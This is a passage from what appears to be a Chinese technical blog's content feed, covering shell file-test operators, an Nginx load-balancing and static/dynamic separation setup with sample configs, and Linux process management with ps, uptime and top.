“efg”：</p><table><thead><tr><th>运算符</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>=</td><td>检测两个字符串是否相等，相等返回 true。</td><td>[ $a = $b ] 返回 false。</td></tr><tr><td>!=</td><td>检测两个字符串是否不相等，不相等返回 true。</td><td>[ $a != $b ] 返回 true。</td></tr><tr><td>-z</td><td>检测字符串长度是否为 0，为 0 返回 true。</td><td>[ -z $a ] 返回 false。</td></tr><tr><td>-n</td><td>检测字符串长度是否不为 0，不为 0 返回 true。</td><td>[ -n “$a” ] 返回 true。</td></tr><tr><td>$</td><td>检测字符串是否为空，不为空返回 true。</td><td>[ $a ] 返回 true。</td></tr></tbody></table><h3 id="文件测试运算符"><a href="#文件测试运算符" class="headerlink" title="文件测试运算符"></a>文件测试运算符</h3><p>文件测试运算符用于检测 Unix 文件的各种属性。<br>属性检测描述如下：</p><table><thead><tr><th><strong>操作符</strong></th><th><strong>说明</strong></th><th><strong>举例</strong></th></tr></thead><tbody><tr><td>-b file</td><td>检测文件是否是块设备文件，如果是，则返回 true。</td><td>[ -b $file ] 返回 false。</td></tr><tr><td>-c file</td><td>检测文件是否是字符设备文件，如果是，则返回 true。</td><td>[ -c $file ] 返回 false。</td></tr><tr><td>-d file</td><td>检测文件是否是目录，如果是，则返回 true。</td><td>[ -d $file ] 返回 false。</td></tr><tr><td>-f file</td><td>检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。</td><td>[ -f $file ] 返回 true。</td></tr><tr><td>-g file</td><td>检测文件是否设置了 SGID 位，如果是，则返回 true。</td><td>[ -g $file ] 返回 false。</td></tr><tr><td>-k file</td><td>检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。</td><td>[ -k $file ] 返回 false。</td></tr><tr><td>-p file</td><td>检测文件是否是有名管道，如果是，则返回 true。</td><td>[ -p $file ] 返回 false。</td></tr><tr><td>-u file</td><td>检测文件是否设置了 SUID 位，如果是，则返回 true。</td><td>[ -u $file ] 返回 false。</td></tr><tr><td>-r file</td><td>检测文件是否可读，如果是，则返回 true。</td><td>[ -r $file ] 返回 true。</td></tr><tr><td>-w file</td><td>检测文件是否可写，如果是，则返回 true。</td><td>[ -w $file ] 返回 true。</td></tr><tr><td>-x file</td><td>检测文件是否可执行，如果是，则返回 true。</td><td>[ -x $file ] 返回 true。</td></tr><tr><td>-s file</td><td>检测文件是否为空（文件大小是否大于 0），不为空返回 true。</td><td>[ -s $file ] 返回 true。</td></tr><tr><td>-e file</td><td>检测文件（包括目录）是否存在，如果是，则返回 true。</td><td>[ -e $file ] 返回 true。</td></tr></tbody></table><p>其他检查符：</p><ul><li><strong>-S</strong>: 判断某文件是否 socket。</li><li><strong>-L</strong>: 检测文件是否存在并且是一个符号链接。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx 负载均衡架构搭建</title>
      <link href="/post/96c7790f.html"/>
      <url>/post/96c7790f.html</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx-负载均衡架构搭建"><a href="#Nginx-负载均衡架构搭建" class="headerlink" title="Nginx 负载均衡架构搭建"></a>Nginx 负载均衡架构搭建</h1><h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>负载均衡跨越多个应用程序实例，是一种常用的技术，其用于优化资源利用率、最大化吞吐量、减少延迟和确保容错配置。<br>​</p><p>可以使用 nginx 作为高效的 HTTP 负载均衡器，将流量分布到多个应用服务器，并通过 nginx 提高 web 应用程序的性能、可扩展性和可靠性。<br>​</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628479273043-3c1a5db5-abe4-43bd-a993-d230aeb282e9.png#clientId=u10a9e2c7-4885-4&amp;from=paste&amp;height=296&amp;id=u9817d764&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=296&amp;originWidth=630&amp;originalType=binary%E2%88%B6=1&amp;size=36423&amp;status=done&amp;style=none&amp;taskId=udd13a58b-085e-4973-be95-77e0e5033c1&amp;width=630" alt="image.png"></p><h2 id="二、静态站点负载均衡"><a href="#二、静态站点负载均衡" class="headerlink" title="二、静态站点负载均衡"></a>二、静态站点负载均衡</h2><h3 id="服务器信息"><a href="#服务器信息" class="headerlink" title="服务器信息"></a>服务器信息</h3><table><thead><tr><th><strong>Hostname</strong></th><th><strong>IP</strong></th></tr></thead><tbody><tr><td>proxy</td><td>192.168.2.88</td></tr><tr><td>web01</td><td>192.168.2.81</td></tr><tr><td>web02</td><td>192.168.2.82</td></tr></tbody></table><h3 id="配置-hosts"><a href="#配置-hosts" class="headerlink" title="配置 hosts"></a>配置 hosts</h3><p>在所有机器的 /etc/hosts 文件添加：</p><pre class="line-numbers language-bash"><code class="language-bash">192.168.2.88 proxy192.168.2.81 web01192.168.2.82 web02<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="安装-nginx"><a href="#安装-nginx" class="headerlink" title="安装 nginx"></a>安装 nginx</h3><p>在所有机器上安装 nginx，参考官方安装文档：</p><blockquote><p><a href="https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/">《Installing NGINX Open Source》</a></p></blockquote><h3 id="nginx-主配置（所有机器）"><a href="#nginx-主配置（所有机器）" class="headerlink" title="nginx 主配置（所有机器）"></a>nginx 主配置（所有机器）</h3><p>主配置文件：/etc/nginx/nginx.conf</p><pre class="line-numbers language-bash"><code class="language-bash">user nginx<span class="token punctuation">;</span>worker_processes auto<span class="token punctuation">;</span>error_log /var/log/nginx/error.log<span class="token punctuation">;</span>pid /run/nginx.pid<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># Load dynamic modules. See /usr/share/doc/nginx/README.dynamic.</span>include /usr/share/nginx/modules/*.conf<span class="token punctuation">;</span>events <span class="token punctuation">{</span>    worker_connections 1024<span class="token punctuation">;</span>    use epoll<span class="token punctuation">;</span>    multi_accept on<span class="token punctuation">;</span><span class="token punctuation">}</span>http <span class="token punctuation">{</span>    log_format  main  <span class="token string">'<span class="token variable">$remote_addr</span> - <span class="token variable">$remote_user</span> [<span class="token variable">$time_local</span>] "<span class="token variable">$request</span>" '</span>                      <span class="token string">'<span class="token variable">$status</span> <span class="token variable">$body_bytes_sent</span> "<span class="token variable">$http_referer</span>" '</span>                      <span class="token string">'"<span class="token variable">$http_user_agent</span>" "<span class="token variable">$http_x_forwarded_for</span>"'</span><span class="token punctuation">;</span>    access_log  /var/log/nginx/access.log  main<span class="token punctuation">;</span>    sendfile            on<span class="token punctuation">;</span>    tcp_nopush          on<span class="token punctuation">;</span>    tcp_nodelay         on<span class="token punctuation">;</span>    keepalive_timeout   65<span class="token punctuation">;</span>    types_hash_max_size 4096<span class="token punctuation">;</span>    include             /etc/nginx/mime.types<span class="token punctuation">;</span>    default_type        application/octet-stream<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># Load modular configuration files from the /etc/nginx/conf.d directory.</span>    <span class="token comment" spellcheck="true"># See http://nginx.org/en/docs/ngx_core_module.html#include</span>    <span class="token comment" spellcheck="true"># for more information.</span>    include /etc/nginx/conf.d/*.conf<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="proxy-配置"><a href="#proxy-配置" class="headerlink" title="proxy 配置"></a>proxy 配置</h3><p>子配置文件：/etc/nginx/conf.d/proxy.conf</p><pre class="line-numbers language-bash"><code class="language-bash">upstream webapp <span class="token punctuation">{</span>    server web01<span class="token punctuation">;</span>    server web02<span class="token punctuation">;</span><span class="token punctuation">}</span>server <span class="token punctuation">{</span>    listen 80<span class="token punctuation">;</span>    charset utf-8<span class="token punctuation">;</span>    access_log /var/log/nginx/app.access.log main<span class="token punctuation">;</span>    location / <span class="token punctuation">{</span>        proxy_pass http://webapp<span class="token punctuation">;</span>        proxy_set_header X-Real-IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>        proxy_set_header X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span><span class="token punctuation">;</span>        proxy_redirect off<span class="token punctuation">;</span>        proxy_connect_timeout 30<span class="token punctuation">;</span>        proxy_send_timeout 15<span class="token punctuation">;</span>        proxy_read_timeout 15<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web01-和-web02-配置"><a href="#web01-和-web02-配置" class="headerlink" title="web01 和 web02 配置"></a>web01 和 web02 配置</h3><p>子配置文件：/etc/nginx/conf.d/webapp.conf</p><pre class="line-numbers language-bash"><code class="language-bash">server <span class="token punctuation">{</span>    listen      80<span class="token punctuation">;</span>    root        /www/wwwroot/webapp<span class="token punctuation">;</span>    location / <span class="token punctuation">{</span>        index   index.html<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h3><p>在所有机器上，检查 nginx 配置</p><pre class="line-numbers language-bash"><code class="language-bash">nginx -t<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>在所有机器上，重启 nginx</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl restart nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="三、动静分离-负载均衡（PHP）"><a href="#三、动静分离-负载均衡（PHP）" class="headerlink" title="三、动静分离+负载均衡（PHP）"></a>三、动静分离+负载均衡（PHP）</h2><h3 id="服务器信息-1"><a href="#服务器信息-1" class="headerlink" title="服务器信息"></a>服务器信息</h3><table><thead><tr><th><strong>Hostname</strong></th><th><strong>IP</strong></th></tr></thead><tbody><tr><td>proxy</td><td>192.168.2.88</td></tr><tr><td>web01</td><td>192.168.2.81</td></tr><tr><td>web02</td><td>192.168.2.82</td></tr><tr><td>phpserver01</td><td>192.168.2.83</td></tr><tr><td>phpserver02</td><td>192.168.2.84</td></tr></tbody></table><p>注：web01 和 web02 存放静态资源文件，phpserver01 和 phpserver02 运行 php 程序，proxy 作为反向代理服务器。</p><h3 id="配置-hosts-1"><a href="#配置-hosts-1" class="headerlink" title="配置 hosts"></a>配置 hosts</h3><p>在 proxy 的 /etc/hosts 文件添加：</p><pre class="line-numbers language-bash"><code class="language-bash">192.168.2.88 proxy192.168.2.81 web01192.168.2.82 web02192.168.2.83 phpserver01192.168.2.84 phpserver02<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="安装-nginx-1"><a href="#安装-nginx-1" class="headerlink" title="安装 nginx"></a>安装 nginx</h3><p>在所有机器上安装 nginx，参考官方安装文档：</p><blockquote><p><a href="https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/">《Installing NGINX Open Source》</a></p></blockquote><h3 id="安装-php"><a href="#安装-php" class="headerlink" title="安装 php"></a>安装 php</h3><p>在 phpserver01 和 phpserver02 上安装 PHP 环境，参考：</p><blockquote><p><a href="https://www.yuque.com/docs/share/e657d0fd-b49d-472a-921b-a124b93792a8#">《CentOS 安装指定版本 PHP》</a></p></blockquote><h3 id="nginx-主配置（所有机器）-1"><a href="#nginx-主配置（所有机器）-1" class="headerlink" title="nginx 主配置（所有机器）"></a>nginx 主配置（所有机器）</h3><p>主配置文件：/etc/nginx/nginx.conf</p><pre class="line-numbers language-bash"><code class="language-bash">user nginx<span class="token punctuation">;</span>worker_processes auto<span class="token punctuation">;</span>error_log /var/log/nginx/error.log<span class="token punctuation">;</span>pid /run/nginx.pid<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># Load dynamic modules. See /usr/share/doc/nginx/README.dynamic.</span>include /usr/share/nginx/modules/*.conf<span class="token punctuation">;</span>events <span class="token punctuation">{</span>    worker_connections 1024<span class="token punctuation">;</span>    use epoll<span class="token punctuation">;</span>    multi_accept on<span class="token punctuation">;</span><span class="token punctuation">}</span>http <span class="token punctuation">{</span>    log_format  main  <span class="token string">'<span class="token variable">$remote_addr</span> - <span class="token variable">$remote_user</span> [<span class="token variable">$time_local</span>] "<span class="token variable">$request</span>" '</span>                      <span class="token string">'<span class="token variable">$status</span> <span class="token variable">$body_bytes_sent</span> "<span class="token variable">$http_referer</span>" '</span>                      <span class="token string">'"<span class="token variable">$http_user_agent</span>" "<span class="token variable">$http_x_forwarded_for</span>"'</span><span class="token punctuation">;</span>    access_log  /var/log/nginx/access.log  main<span class="token punctuation">;</span>    sendfile            on<span class="token punctuation">;</span>    tcp_nopush          on<span class="token punctuation">;</span>    tcp_nodelay         on<span class="token punctuation">;</span>    keepalive_timeout   65<span class="token punctuation">;</span>    types_hash_max_size 4096<span class="token punctuation">;</span>    include             /etc/nginx/mime.types<span class="token punctuation">;</span>    default_type        application/octet-stream<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># Load modular configuration files from the /etc/nginx/conf.d directory.</span>    <span class="token comment" spellcheck="true"># See http://nginx.org/en/docs/ngx_core_module.html#include</span>    <span class="token comment" spellcheck="true"># for more information.</span>    include /etc/nginx/conf.d/*.conf<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="proxy-配置-1"><a href="#proxy-配置-1" class="headerlink" title="proxy 配置"></a>proxy 配置</h3><p>子配置文件：/etc/nginx/conf.d/proxy.conf</p><pre class="line-numbers language-bash"><code class="language-bash">upstream webapp <span class="token punctuation">{</span>    server web01<span class="token punctuation">;</span>    server web02<span class="token punctuation">;</span><span class="token punctuation">}</span>upstream phpserver <span class="token punctuation">{</span>    server phpserver01<span class="token punctuation">;</span>    server phpserver02<span class="token punctuation">;</span><span class="token punctuation">}</span>server <span class="token punctuation">{</span>    listen 80<span class="token punctuation">;</span>    charset utf-8<span class="token punctuation">;</span>    access_log /var/log/nginx/app.access.log main<span class="token punctuation">;</span>    location / <span class="token punctuation">{</span>        index index.php<span class="token punctuation">;</span>        proxy_pass http://phpserver<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    location ~* \.<span class="token punctuation">(</span>jpg<span class="token operator">|</span>jpeg<span class="token operator">|</span>gif<span class="token operator">|</span>css<span class="token operator">|</span>png<span class="token operator">|</span>js<span class="token operator">|</span>ico<span class="token operator">|</span>html<span class="token operator">|</span>htm<span class="token operator">|</span>txt<span class="token punctuation">)</span>$ <span class="token punctuation">{</span>        proxy_pass http://webapp<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    location ~ \.php$ <span class="token punctuation">{</span>        proxy_pass http://phpserver<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web01-和-web02-配置-1"><a href="#web01-和-web02-配置-1" class="headerlink" title="web01 和 web02 配置"></a>web01 和 web02 配置</h3><p>子配置文件：/etc/nginx/conf.d/webapp.conf</p><pre class="line-numbers language-bash"><code class="language-bash">server <span class="token punctuation">{</span>    listen      80<span class="token punctuation">;</span>    root        /www/wwwroot/webapp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="phpserver01-和-phpserver02-配置"><a href="#phpserver01-和-phpserver02-配置" class="headerlink" title="phpserver01 和 phpserver02 配置"></a>phpserver01 和 phpserver02 配置</h3><p>子配置文件：/etc/nginx/conf.d/php.conf</p><pre class="line-numbers language-bash"><code class="language-bash">server <span class="token punctuation">{</span>    listen 80<span class="token punctuation">;</span>    server_name phpserver01<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># === Fastcgi Config ===</span>    fastcgi_connect_timeout 30<span class="token punctuation">;</span>    fastcgi_send_timeout 30<span class="token punctuation">;</span>    fastcgi_read_timeout 30<span class="token punctuation">;</span>    fastcgi_buffer_size  64k<span class="token punctuation">;</span>    fastcgi_buffers 4 64k<span class="token punctuation">;</span>    fastcgi_busy_buffers_size 128k<span class="token punctuation">;</span>    fastcgi_temp_file_write_size 128k<span class="token punctuation">;</span>    location / <span class="token punctuation">{</span>        root /www/wwwroot/webapp<span class="token punctuation">;</span>        fastcgi_pass 127.0.0.1:9000<span class="token punctuation">;</span>        fastcgi_index index.php<span class="token punctuation">;</span>        fastcgi_param SCRIPT_FILENAME <span class="token variable">$document_root</span><span class="token variable">$fastcgi_script_name</span><span class="token punctuation">;</span>        include fastcgi_params<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="重启服务-1"><a href="#重启服务-1" class="headerlink" title="重启服务"></a>重启服务</h3><p>在所有机器上，检查 nginx 配置</p><pre class="line-numbers language-bash"><code class="language-bash">nginx -t<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>在所有机器上，重启 nginx</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl restart nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>在 phpserver01 和 phpserver02 上启动 php-fpm</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl start php-fpm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> Nginx </tag>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 进程管理</title>
      <link href="/post/6b95d0a0.html"/>
      <url>/post/6b95d0a0.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-进程管理"><a href="#Linux-进程管理" class="headerlink" title="Linux 进程管理"></a>Linux 进程管理</h1><h2 id="一、进程介绍"><a href="#一、进程介绍" class="headerlink" title="一、进程介绍"></a>一、进程介绍</h2><p>正在运行的程序的实例称为进程。每次运行 shell 命令时，都会运行一个程序并为其创建一个进程。Linux 中的每个进程都有一个进程 ID(PID)，它与特定的用户和组帐户相关联。<br>Linux 是一个多任务操作系统，这意味着可以同时运行多个程序（进程也称为任务），这些任务共享公共处理资源（如 CPU 和内存）。<br>​</p><h2 id="二、进程类型"><a href="#二、进程类型" class="headerlink" title="二、进程类型"></a>二、进程类型</h2><p>在 Linux 中，进程可以有两种类型：</p><ul><li>前台进程</li></ul><p>依赖于用户的输入，也称为交互进程</p><ul><li>后台进程</li></ul><p>独立于用户运行，称为非交互式或自动进程<br>​</p><h2 id="三、进程状态"><a href="#三、进程状态" class="headerlink" title="三、进程状态"></a>三、进程状态</h2><p>Linux 中的进程在创建之后和终止之前可以经历不同的状态，这些状态是：</p><table><thead><tr><th><strong>procfs</strong></th><th><strong>进程状态</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>R(runnng)</td><td>TASK_RUNNING</td><td>可运行状态。未必正在使用 CPU，也许是在等待调度</td></tr><tr><td>S(sleeping)</td><td>TASK_INTERRUPTIBLE</td><td>可中断的睡眠状态。正在等待某个条件满足</td></tr><tr><td>D(disk sleeping)</td><td>TASK_UNINTERRUPTIBLE</td><td>不可中断的睡眠状态。不会被信号中断</td></tr><tr><td>T(stopped)</td><td>__TASK_STOPPED</td><td>暂停状态。收到某种信号，运行被停止</td></tr><tr><td>t(tracing stop)</td><td>__TASK_TRACED</td><td>被跟踪状态。进程停止，被另一个进程跟踪</td></tr><tr><td>Z(zombie)</td><td>EXIT_ZOMBIE</td><td>僵尸状态。进程已经退出，但尚未被父进程或者 init 进程收尸</td></tr><tr><td>X(dead)</td><td>EXIT_DEAD</td><td>真正的死亡状态</td></tr></tbody></table><p>进程的状态流转过程如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628072870533-6438fb14-a2b8-4348-879c-4b710c9c4b0c.png#clientId=ud2db8e8c-3921-4&amp;from=paste&amp;height=308&amp;id=ubb6862cb&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=308&amp;originWidth=976&amp;originalType=binary%E2%88%B6=1&amp;size=51376&amp;status=done&amp;style=none&amp;taskId=u756dec58-af30-484e-984b-699e58f4d54&amp;width=976" alt="image.png"></p><h2 id="四、进程属性"><a href="#四、进程属性" class="headerlink" title="四、进程属性"></a>四、进程属性</h2><table><thead><tr><th><strong>属性</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>PID</td><td>进程的 ID 号</td></tr><tr><td>PPID</td><td>父进程（产生当前进程的进程）的 PID</td></tr><tr><td>UID（RUID）</td><td>启动进程的用户 ID</td></tr><tr><td>EUID</td><td>有效用户 ID，一种确定对系统资源的访问权限</td></tr><tr><td>GID（RGID）</td><td>启动进程的用户所属的组</td></tr><tr><td>EGID</td><td>有效组所有者，不同于 RGID， SGID 应用于文件</td></tr><tr><td>状态</td><td>R - 运行，W - 就绪，S - 休眠，Z - 僵尸</td></tr><tr><td>优先级</td><td>进程执行的优先级</td></tr><tr><td>TTY</td><td>进程连接到的终端</td></tr></tbody></table><h2 id="五、ps-查看进程"><a href="#五、ps-查看进程" class="headerlink" title="五、ps 查看进程"></a>五、ps 查看进程</h2><h3 id="命令介绍"><a href="#命令介绍" class="headerlink" title="命令介绍"></a>命令介绍</h3><p>ps 命令是“Process Status”的缩写，它显示当前正在运行的进程。但是，它与 top 命令不同，生成的输出不是实时的。<br>ps 命令是最基本同时也是非常强大的进程查看命令，使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等，总之大部分信息都是可以通过执行该命令得到的。<br>语法格式：<code>ps [参数]</code></p><p>下表描述了通常出现在 ps 输出中的列的含义：</p><table><thead><tr><th><strong>列标题</strong></th><th><strong>解释</strong></th></tr></thead><tbody><tr><td>%CPU</td><td>进程使用了多少 CPU</td></tr><tr><td>%MEM</td><td>进程使用了多少内存</td></tr><tr><td>ADDR</td><td>进程的内存地址</td></tr><tr><td>C 或 CP</td><td>CPU 使用率和调度信息</td></tr><tr><td>COMMAND*</td><td>进程的名称，包括参数，如果有的话</td></tr><tr><td>NI</td><td>nice 价值</td></tr><tr><td>F</td><td>旗帜</td></tr><tr><td>PID</td><td>进程标识号</td></tr><tr><td>PPID</td><td>进程的父进程的 ID 号</td></tr><tr><td>PRI</td><td>进程的优先级</td></tr><tr><td>RSS</td><td>实际内存使用</td></tr><tr><td>S 或 STAT</td><td>进程状态码</td></tr><tr><td>START 或 STIME</td><td>进程开始的时间</td></tr><tr><td>SZ</td><td>虚拟内存使用</td></tr><tr><td>TIME</td><td>总 CPU 使用率</td></tr><tr><td>TT 或 TTY</td><td>与进程关联的终端</td></tr><tr><td>UID 或 USER</td><td>进程所有者的用户名</td></tr><tr><td>WCHAN</td><td>进程正在等待的事件的内存地址</td></tr></tbody></table><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>a</td><td>显示跟当前终端关联的所有进程</td></tr><tr><td>u</td><td>基于用户的格式显示</td></tr><tr><td>x</td><td>显示所有进程，不以终端机来区分</td></tr><tr><td>-e</td><td>显示所有进程</td></tr><tr><td>-f</td><td>以完整格式输出</td></tr></tbody></table><h3 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h3><h4 id="以-BSD-格式显示所有进程"><a href="#以-BSD-格式显示所有进程" class="headerlink" title="以 BSD 格式显示所有进程"></a>以 BSD 格式显示所有进程</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -aux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h4 id="查看完整格式的所有进程"><a href="#查看完整格式的所有进程" class="headerlink" title="查看完整格式的所有进程"></a>查看完整格式的所有进程</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -ef<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h4 id="显示指定用户信息"><a href="#显示指定用户信息" class="headerlink" title="显示指定用户信息"></a>显示指定用户信息</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -u root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h4 id="按-CPU-资源的使用量进行排序"><a href="#按-CPU-资源的使用量进行排序" class="headerlink" title="按 CPU 资源的使用量进行排序"></a>按 CPU 资源的使用量进行排序</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">sort</span> -nk 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h4 id="按内存资源的使用量进行排序"><a href="#按内存资源的使用量进行排序" class="headerlink" title="按内存资源的使用量进行排序"></a>按内存资源的使用量进行排序</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">sort</span> -rnk 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h4 id="查看进程-PID"><a href="#查看进程-PID" class="headerlink" title="查看进程 PID"></a>查看进程 PID</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -C process_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h4 id="将-ps-命令与-grep-一起使用"><a href="#将-ps-命令与-grep-一起使用" class="headerlink" title="将 ps 命令与 grep 一起使用"></a>将 ps 命令与 grep 一起使用</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">grep</span> systemd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h2 id="六、uptime-查看系统负载"><a href="#六、uptime-查看系统负载" class="headerlink" title="六、uptime 查看系统负载"></a>六、uptime 查看系统负载</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Linux 系统中的 uptime 命令主要用于获取主机运行时间和查询 Linux 系统负载等信息。<br>uptime 命令可以显示系统已经运行了多长时间，信息显示依次为：现在时间、系统已经运行了多长时间、目前有多少登录用户、系统在过去的 1 分钟、5 分钟和 15 分钟内的平均负载。 uptime 命令用法十分简单，直接输入 uptime 即可查看系统负载情况。<br>​</p><p>语法格式：<code>uptime [参数]</code><br>​</p><h3 id="常用参数-1"><a href="#常用参数-1" class="headerlink" title="常用参数"></a>常用参数</h3><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>-p</td><td>以漂亮的格式显示机器正常运行的时间</td></tr><tr><td>-s</td><td>系统自开始运行时间，格式为 yyyy-mm-dd hh:mm:ss</td></tr><tr><td>-h</td><td>显示帮助信息</td></tr></tbody></table><h3 id="用例-1"><a href="#用例-1" class="headerlink" title="用例"></a>用例</h3><h4 id="显示当前系统运行负载情况"><a href="#显示当前系统运行负载情况" class="headerlink" title="显示当前系统运行负载情况"></a>显示当前系统运行负载情况</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">uptime</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="显示机器正常运行的时间"><a href="#显示机器正常运行的时间" class="headerlink" title="显示机器正常运行的时间"></a>显示机器正常运行的时间</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">uptime</span> -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="显示机器启动时间"><a href="#显示机器启动时间" class="headerlink" title="显示机器启动时间"></a>显示机器启动时间</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">uptime</span> -s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="七、top-实时显示进程动态"><a href="#七、top-实时显示进程动态" class="headerlink" title="七、top 实时显示进程动态"></a>七、top 实时显示进程动态</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>top 命令是 Linux 下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况，常用于服务端性能分析。<br>在 top 命令中按 f 按可以查看显示的列信息，按对应字母来开启/关闭列，大写字母表示开启，小写字母表示关闭。带*号的是默认列。<br>​</p><p>语法格式：<code>top [参数]</code><br>​</p><h3 id="常用参数-2"><a href="#常用参数-2" class="headerlink" title="常用参数"></a>常用参数</h3><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>-d</td><td>改变显示的更新速度，或是在交谈式指令列( interactive command)按 